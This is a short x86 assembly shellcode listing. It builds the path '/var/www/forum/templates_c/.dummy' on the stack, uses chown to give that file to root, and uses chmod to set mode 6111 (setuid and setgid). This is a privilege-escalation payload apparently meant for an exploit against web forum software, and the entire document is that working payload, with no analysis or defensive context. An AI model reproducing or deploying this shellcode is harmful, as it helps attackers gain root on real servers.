section .text
    global _start

_start:
    xor eax, eax         ; Clear eax
    xor ecx, ecx         ; Clear ecx
    push eax             ; Push null byte onto stack
	push 0x796d6d75      ; ummy
	push 0x642e2f63      ; c/.d
	push 0x5f736574      ; tes_
	push 0x616c706d      ; mpla
	push 0x65742f6d      ; m/te
	push 0x75726f66      ; foru
	push 0x2f777777      ; www/
	push 0x2f726176      ; var/
	push 0x2f2f2f2f      ; ////

	mov ebx, esp         ; Move stack pointer to ebx

	; chown
	mov al, 16		     ; Set syscall number to 16 (chown)
	xor ecx, ecx         ; Clear ecx
    xor edx, edx         ; Clear edx
	int 0x80             ; Call the kernel

	; chmod
	mov al, 15		     ; Set syscall number to 15 (chmod)
	mov cx, 3145         ; Set mode to 6111
	int 0x80             ; Call the kernel
    
	; Exit
    mov al, 1            ; sys_exit
    xor ebx, ebx
    int 0x80